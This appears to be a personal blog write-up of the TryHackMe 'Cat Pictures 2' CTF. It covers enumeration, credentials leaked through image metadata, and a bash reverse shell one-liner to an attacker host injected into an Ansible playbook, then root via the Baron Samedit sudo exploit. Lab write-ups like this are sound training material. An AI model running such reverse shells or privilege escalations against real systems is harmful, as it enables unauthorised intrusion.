# Cat Pictures 2 Writeup

This is a walkthrough of the Cat Pictures 2 CTF from TryHackMe. The room can be accessed [here](https://tryhackme.com/room/catpictures2).

## Recon

I started by running an Nmap scan to identify open ports on the target machine:

```shell
nmap -sV -sC -p- <#TARGETIP> -o nmap
```

The scan revealed the following open portsf:

 - 22: OpenSSH 7.6p1
 - 80: Nginx 1.4.6 (Lychee version 3.1.1 photo album with cat pictures)
 - 222: OpenSSH 9.0 (Unusual port)
 - 1337: OliveTin (Web interface to run predefined shell commands)
 - 3000: Gitea (Lightweight DevOps platform)
 - 8080: Nginx default webpage (Possibly with subdirectories)

 ## Web Pages

 I began exploring the web applications hosted on different ports:

 - Port 80: Found a Lychee photo album with cat pictures.
 ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/1.png?text=First+Pic)

 - Port 1337: Discovered OliveTin, a web interface to execute scripts and run Ansible Playbooks.

  ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/2.png?text=First+Pic)

 - Port 3000: Accessed Gitea, a platform that might be hosting scripts and runbooks.

   ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/3.png?text=First+Pic)

 - Port 8080: Default Nginx webpage, further inspection may reveal subdirectories.

   ![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/4.png?text=First+Pic)

After running gobuster and checking for vulnerabilities, nothing significant was found. So, I focused on the cat pictures hosted on port 80.

## Cat Pictures Analysis

I downloaded all the cat pictures and checked them for exif data using exiftool. One picture revealed interesting information of a text file on a subdomain of one of the web applications:

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/5.png?text=First+Pic)

Visiting the URL led me to a text file with the following information:

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/6.png?text=First+Pic)

I managed to gain access to the website with the credentials from the text file and explored the user's repository, where I found `flag1.txt` (1/3 flags).

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/7.png?text=First+Pic)

## Ansible Playbook

Next, I inspected the `playbook.yaml` file and noticed it contains a shell command: `shell: echo hi`.

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/8.png?text=First+Pic)

 Knowing that OliveTin on port 1337 allows running Ansible Playbooks, I replaced the command with simple `bash` reverse shell payload from [RevShells.com](https://revshells.com).

 ```
bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
 ```

Setting up a NetCat listener and clicking "Run Ansible Playbook" triggered the payload, which gave me a shell on the box. Exploring the user directory file gave me another text file named flag2.txt (2/3 flags).

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/9.png?text=First+Pic)

## Privilege Escalation

With a reverse shell on the target machine, I looked around for interesting files and uploaded `linpeas.sh` to find vulnerabilities. One stood out: **[CVE-2021-3156] sudo Baron Samedit**.

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/10.png?text=First+Pic)

To exploit this, I downloaded the exploit, uploaded it to the target machine, compiled it with `make`, and executed the `./sudo-hax-me-a-sandwich` outfile to gain root access.

![App Screenshot](https://willmaxcy.com/assets/imgs/catpics2/11.png?text=First+Pic)

From here, I moved to the `/root` file directory and found the flag3.txt (3/3 flags).

Thanks for checking out my writeup! Feel free to reach out with any questions or comments.

## Additional Insights
In this room, it was crucial to analyze multiple services and understand their interactions. By leveraging known vulnerabilities and employing a methodical approach, I was able to gain necessary access and escalate privileges efficiently. It's also worth noting the importance of having various tools in your arsenal, like Nmap for initial recon, exiftool for metadata analysis, and linpeas for privilege escalation checks.

Furthermore, it's important to document each step carefully. Not only does this help in reporting and sharing your findings, but it also assists in troubleshooting any issues that arise during the exploitation process. Maintaining a clear and detailed write-up ensures that you can replicate your steps if needed and provides valuable learning material for others.

## Feedback

If you have any feedback, please reach out to me at will@willmaxcy.com.

[![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://willmaxcy.com/)
[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/willmaxcy)
